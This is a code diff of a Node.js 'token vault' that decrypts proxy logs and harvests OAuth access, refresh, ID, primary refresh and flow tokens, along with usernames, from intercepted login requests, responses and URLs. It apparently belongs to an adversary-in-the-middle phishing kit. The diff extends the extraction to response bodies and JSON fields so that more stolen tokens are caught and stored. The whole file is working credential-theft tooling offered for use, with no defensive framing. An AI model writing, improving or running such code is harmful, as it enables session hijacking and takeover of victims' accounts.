@@ -1,4 +1,4 @@
-// token_vault.js - Token Vault & Health Check
+// token_vault.js - Token Vault & Health Check (FULLY FIXED)
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
@@ -38,7 +38,7 @@ class TokenVault {
         fs.writeFileSync(this.vaultFile, JSON.stringify(this.tokens, null, 2));
     }
 
-    // Extract tokens from a log file
+    // Extract tokens from a log file (FIXED)
     extractTokens(logFilename) {
         const filePath = path.join(this.logDir, logFilename);
         if (!fs.existsSync(filePath)) return [];
@@ -55,71 +55,104 @@ class TokenVault {
                 const decrypted = this.decryptData(encrypted, iv);
                 const obj = JSON.parse(decrypted);
 
+                // ── CHECK REQUEST BODY ──
                 const body = obj.proxyRequestBody || '';
                 const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
 
-                // Extract tokens
-                const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
-                const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
-                const idMatch = bodyStr.match(/id_token=([^&]+)/i);
-                const prtMatch = bodyStr.match(/primaryRefreshToken[=:]+([^&"',}]+)/i);
-                const flowTokenMatch = bodyStr.match(/flowToken[=:]+([^&"',}]+)/i);
+                // ── CHECK RESPONSE BODY (FIX: THIS WAS MISSING!) ──
+                const respBody = obj.proxyResponseBody || '';
+                const respStr = typeof respBody === 'string' ? respBody : JSON.stringify(respBody);
 
-                // Extract username
+                // ── CHECK URL ──
+                const url = obj.proxyRequestURL || '';
+
+                // Combine all sources for searching
+                const allData = bodyStr + ' ' + respStr + ' ' + url;
+
+                // Extract username (try all sources)
                 let username = 'Unknown';
-                const userMatch = bodyStr.match(/(?:username|login|user|Email|loginfmt)=([^&]+)/i);
+                const userMatch = allData.match(/(?:username|login|user|Email|loginfmt)=([^&]+)/i);
                 if (userMatch) username = decodeURIComponent(userMatch[1]);
 
-                if (accessMatch) {
-                    tokens.push({
-                        type: 'access_token',
-                        value: decodeURIComponent(accessMatch[1]),
-                        username: username,
-                        sourceFile: logFilename,
-                        timestamp: obj.timestamp || new Date().toISOString(),
-                        status: 'unknown'
-                    });
+                // ── PATTERNS FOR TOKENS ──
+                const patterns = [
+                    { type: 'access_token', regex: /access_token["']?\s*[:=]\s*["']([^"']+)["']/i },
+                    { type: 'refresh_token', regex: /refresh_token["']?\s*[:=]\s*["']([^"']+)["']/i },
+                    { type: 'id_token', regex: /id_token["']?\s*[:=]\s*["']([^"']+)["']/i },
+                    { type: 'prt', regex: /primaryRefreshToken["']?\s*[:=]\s*["']([^"']+)["']/i },
+                    { type: 'flow_token', regex: /flowToken["']?\s*[:=]\s*["']([^"']+)["']/i },
+                    { type: 'access_token', regex: /access_token=([^&]+)/i },
+                    { type: 'refresh_token', regex: /refresh_token=([^&]+)/i },
+                    { type: 'id_token', regex: /id_token=([^&]+)/i },
+                    { type: 'code', regex: /code["']?\s*[:=]\s*["']([^"']+)["']/i },
+                ];
+
+                for (const pattern of patterns) {
+                    const match = allData.match(pattern.regex);
+                    if (match) {
+                        const value = decodeURIComponent(match[1]);
+                        // Avoid duplicates
+                        const existing = tokens.find(t => t.value === value);
+                        if (!existing) {
+                            tokens.push({
+                                type: pattern.type,
+                                value: value,
+                                username: username,
+                                sourceFile: logFilename,
+                                timestamp: obj.timestamp || new Date().toISOString(),
+                                status: 'unknown'
+                            });
+                            console.log(`✅ Token Vault: Found ${pattern.type} in ${logFilename}`);
+                        }
+                    }
                 }
-                if (refreshMatch) {
-                    tokens.push({
-                        type: 'refresh_token',
-                        value: decodeURIComponent(refreshMatch[1]),
-                        username: username,
-                        sourceFile: logFilename,
-                        timestamp: obj.timestamp || new Date().toISOString(),
-                        status: 'unknown'
-                    });
-                }
-                if (idMatch) {
-                    tokens.push({
-                        type: 'id_token',
-                        value: decodeURIComponent(idMatch[1]),
-                        username: username,
-                        sourceFile: logFilename,
-                        timestamp: obj.timestamp || new Date().toISOString(),
-                        status: 'unknown'
-                    });
-                }
-                if (prtMatch) {
-                    tokens.push({
-                        type: 'prt',
-                        value: decodeURIComponent(prtMatch[1]),
-                        username: username,
-                        sourceFile: logFilename,
-                        timestamp: obj.timestamp || new Date().toISOString(),
-                        status: 'unknown'
-                    });
-                }
-                if (flowTokenMatch) {
-                    tokens.push({
-                        type: 'flow_token',
-                        value: decodeURIComponent(flowTokenMatch[1]),
-                        username: username,
-                        sourceFile: logFilename,
-                        timestamp: obj.timestamp || new Date().toISOString(),
-                        status: 'unknown'
-                    });
-                }
+
+                // ── ALSO CHECK FOR TOKENS IN JSON RESPONSE BODY ──
+                try {
+                    const jsonResp = typeof respBody === 'string' ? JSON.parse(respBody) : respBody;
+                    if (jsonResp.access_token) {
+                        const value = jsonResp.access_token;
+                        const existing = tokens.find(t => t.value === value);
+                        if (!existing) {
+                            tokens.push({
+                                type: 'access_token',
+                                value: value,
+                                username: username,
+                                sourceFile: logFilename,
+                                timestamp: obj.timestamp || new Date().toISOString(),
+                                status: 'unknown'
+                            });
+                        }
+                    }
+                    if (jsonResp.refresh_token) {
+                        const value = jsonResp.refresh_token;
+                        const existing = tokens.find(t => t.value === value);
+                        if (!existing) {
+                            tokens.push({
+                                type: 'refresh_token',
+                                value: value,
+                                username: username,
+                                sourceFile: logFilename,
+                                timestamp: obj.timestamp || new Date().toISOString(),
+                                status: 'unknown'
+                            });
+                        }
+                    }
+                    if (jsonResp.id_token) {
+                        const value = jsonResp.id_token;
+                        const existing = tokens.find(t => t.value === value);
+                        if (!existing) {
+                            tokens.push({
+                                type: 'id_token',
+                                value: value,
+                                username: username,
+                                sourceFile: logFilename,
+                                timestamp: obj.timestamp || new Date().toISOString(),
+                                status: 'unknown'
+                            });
+                        }
+                    }
+                } catch (e) {}
             } catch (e) {}
         }
 
@@ -128,7 +161,10 @@ class TokenVault {
 
     // Scan all logs and update vault
     scanLogs() {
+        console.log('🔍 Scanning logs for tokens...');
         const files = fs.readdirSync(this.logDir).filter(f => f.endsWith('.log'));
+        console.log(`📁 Found ${files.length} log files`);
+        
         const newTokens = [];
 
         for (const file of files) {
@@ -136,16 +172,21 @@ class TokenVault {
             newTokens.push(...extracted);
         }
 
+        console.log(`🔑 Found ${newTokens.length} new tokens`);
+
         // Merge with existing vault (avoid duplicates)
-        const existingValues = new Set(this.tokens.map(t => t.value.substring(0, 20)));
+        const existingValues = new Set(this.tokens.map(t => t.value.substring(0, 30)));
+        let addedCount = 0;
         for (const token of newTokens) {
-            const key = token.value.substring(0, 20);
+            const key = token.value.substring(0, 30);
             if (!existingValues.has(key)) {
                 this.tokens.push(token);
                 existingValues.add(key);
+                addedCount++;
             }
         }
 
+        console.log(`📥 Added ${addedCount} new tokens to vault`);
         this.save();
         return this.tokens;
     }
